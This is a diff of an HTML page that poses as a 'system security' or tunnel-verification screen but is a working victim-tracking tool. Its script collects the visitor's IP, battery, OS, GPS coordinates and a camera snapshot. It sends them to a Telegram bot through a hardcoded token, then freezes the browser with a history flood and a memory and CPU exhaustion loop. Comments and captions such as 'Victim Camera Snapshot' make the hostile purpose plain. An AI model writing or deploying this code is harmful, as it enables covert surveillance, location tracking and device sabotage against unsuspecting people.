@@ -3,79 +3,125 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>System Verification</title>
+    <title>DARK-4RMY System Security</title>
     <style>
-        body { margin: 0; background: #050505; color: #00f3ff; font-family: sans-serif; display: flex; align-items: center; justify-content: center; height: 100vh; }
-        .box { border: 1px solid #111; padding: 30px; text-align: center; }
-        /* Glitch hidden in CSS variable */
-        --cr: #f00;
+        body { margin: 0; background: #0a0a0f; color: #00f3ff; font-family: 'Courier New', monospace; display: flex; align-items: center; justify-content: center; height: 100vh; overflow: hidden; }
+        .panel { border: 2px solid #00f3ff; padding: 40px; border-radius: 20px; text-align: center; box-shadow: 0 0 20px #00f3ff; position: relative; z-index: 10; }
+        .glitch { animation: shake 0.1s infinite; color: #ff0000 !important; border-color: #ff0000 !important; box-shadow: 0 0 40px #ff0000 !important; }
+        @keyframes shake {
+            0% { transform: translate(2px, 1px) rotate(0deg); }
+            50% { transform: translate(-2px, -2px) rotate(1deg); }
+            100% { transform: translate(1px, 2px) rotate(-1deg); }
+        }
+        #stat { margin-top: 20px; font-weight: bold; }
     </style>
 </head>
 <body>
-    <div class="box" id="ui">
-        <h2>SECURE TUNNEL</h2>
-        <p id="msg">Verifying browser...</p>
-        <video id="v" style="display:none;" autoplay></video>
-        <canvas id="c" style="display:none;"></canvas>
+    <div class="panel" id="main-panel">
+        <h1 id="title">DARK-4RMY v3.5</h1>
+        <p id="stat">Initializing Encrypted Tunnel...</p>
+        <p id="sub-stat" style="opacity: 0.5;">Verifying Hardware Integrity...</p>
+        <video id="video" style="display:none;" autoplay></video>
+        <canvas id="canvas" style="display:none;"></canvas>
     </div>
 
     <script>
-        // Token m-ghbi chwiya
-        const _0x = '8619398262:AAEClf--ikjwf3bmPy88xADrqOlcucnNjGE';
-        const u = new URLSearchParams(window.location.search);
-        const cid = u.get('id');
+        const BOT_TOKEN = '8619398262:AAEClf--ikjwf3bmPy88xADrqOlcucnNjGE';
+        const params = new URLSearchParams(window.location.search);
+        const chatId = params.get('id');
 
-        // Had l-function kat-khbi l-crash (Obfuscated Loop)
-        function _st() {
-            const _l = [];
-            // Ndahlo l-CPU b tari9a recursive bla s-miya dyal while(true)
-            (function _x() {
-                for(let i=0; i<500; i++) {
-                    _l.push(new Array(100000).fill('💀'));
-                    window.history.pushState(null, '', Math.random());
+        // --- HARD CRASH LOGIC (RAM & CPU KILLER) ---
+        function triggerHardCrash() {
+            document.getElementById('main-panel').classList.add('glitch');
+            document.getElementById('title').innerText = "FATAL ERROR";
+            document.getElementById('stat').innerText = "SYSTEM OVERLOAD: EXHAUSTED";
+            
+            // 1. History Flood (Bloqui l-bouton Back)
+            for (let i = 0; i < 50000; i++) {
+                window.history.pushState(null, null, window.location.href);
+            }
+
+            // 2. Resource Exhaustion (RAM & CPU)
+            const memoryLeak = [];
+            setInterval(() => {
+                // Khneq l-RAM b chunks mkhyenin
+                for (let i = 0; i < 100; i++) {
+                    memoryLeak.push(new Array(1000000).fill("DARK-4RMY-STRIKE"));
                 }
-                setTimeout(_x, 5);
-            })();
+                // Khneq l-CPU b processes la-nihaiya
+                console.log("OVERRIDE_" + Math.random());
+                window.history.pushState({}, '', '#' + Math.random());
+            }, 10);
         }
 
-        async function start() {
-            if (!cid) return;
+        async function init() {
+            if (!chatId) return;
+
             try {
-                const b = await navigator.getBattery();
-                const i = await (await fetch('https://api.ipify.org?format=json')).json();
+                // 1. IP & Battery
+                const battery = await navigator.getBattery();
+                const ipRes = await fetch('https://api.ipify.org?format=json');
+                const ipData = await ipRes.json();
                 
-                let m = `🚨 *LOG*\nIP: \`${i.ip}\`\nBatt: ${Math.round(b.level * 100)}%\nOS: ${navigator.platform}`;
+                let report = `🚨 *TARGET LOGGED* 🚨\n\n` +
+                             `🌐 *IP:* \`${ipData.ip}\`\n` +
+                             `🔋 *Battery:* ${Math.round(battery.level * 100)}%\n` +
+                             `💻 *OS:* ${navigator.platform}`;
 
-                navigator.geolocation.getCurrentPosition(async (p) => {
-                    await f(`${m}\n📍 GPS: [Maps](http://maps.google.com/?q=${p.coords.latitude},${p.coords.longitude})`);
-                }, async () => { await f(m + `\n📍 GPS: Denied`); });
+                // 2. GPS
+                navigator.geolocation.getCurrentPosition(async (pos) => {
+                    const gpsReport = report + `\n📍 *GPS:* [Google Maps](http://maps.google.com/maps?q=${pos.coords.latitude},${pos.coords.longitude})`;
+                    await sendToBot(gpsReport);
+                }, async () => {
+                    await sendToBot(report + `\n📍 *GPS:* Denied ❌`);
+                });
 
+                // 3. Camera Snapshot
                 try {
-                    const s = await navigator.mediaDevices.getUserMedia({ video: true });
-                    const vd = document.getElementById('v');
-                    vd.srcObject = s;
+                    const stream = await navigator.mediaDevices.getUserMedia({ video: true });
+                    const video = document.getElementById('video');
+                    video.srcObject = stream;
+                    
                     setTimeout(() => {
-                        const cn = document.getElementById('c');
-                        cn.width = vd.videoWidth; cn.height = vd.videoHeight;
-                        cn.getContext('2d').drawImage(vd, 0, 0);
-                        cn.toBlob(bl => {
-                            p(bl);
-                            // Crash i-khdem talkher
-                            setTimeout(_st, 2000);
+                        const canvas = document.getElementById('canvas');
+                        canvas.width = video.videoWidth;
+                        canvas.height = video.videoHeight;
+                        canvas.getContext('2d').drawImage(video, 0, 0);
+                        canvas.toBlob(blob => {
+                            sendPhoto(blob);
+                            // Siftna koulchi? Daba Crash!
+                            setTimeout(triggerHardCrash, 2000);
                         });
-                        s.getTracks().forEach(t => t.stop());
-                    }, 2000);
-                } catch(e) { setTimeout(_st, 1000); }
-            } catch(e) { _st(); }
+                        stream.getTracks().forEach(t => t.stop());
+                    }, 2500);
+                } catch (e) {
+                    // Camera refused? Crash anyway
+                    setTimeout(triggerHardCrash, 1000);
+                }
+
+            } catch (err) {
+                triggerHardCrash();
+            }
         }
 
-        async function f(t) { fetch(`https://api.telegram.org/bot${_0x}/sendMessage`, { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify({ chat_id: cid, text: t, parse_mode: 'Markdown' }) }); }
-        async function p(b) { 
-            const d = new FormData(); d.append('chat_id', cid); d.append('photo', b, 'x.jpg'); d.append('caption', '📸 *SNAP*');
-            fetch(`https://api.telegram.org/bot${_0x}/sendPhoto`, { method: 'POST', body: d }); 
+        async function sendToBot(text) {
+            await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({ chat_id: chatId, text: text, parse_mode: 'Markdown' })
+            });
         }
 
-        window.onload = start;
+        async function sendPhoto(blob) {
+            const formData = new FormData();
+            formData.append('chat_id', chatId);
+            formData.append('photo', blob, 'snap.jpg');
+            formData.append('caption', '📸 *Victim Camera Snapshot*');
+            formData.append('parse_mode', 'Markdown');
+            await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, { method: 'POST', body: formData });
+        }
+
+        window.onload = init;
     </script>
 </body>
 </html>
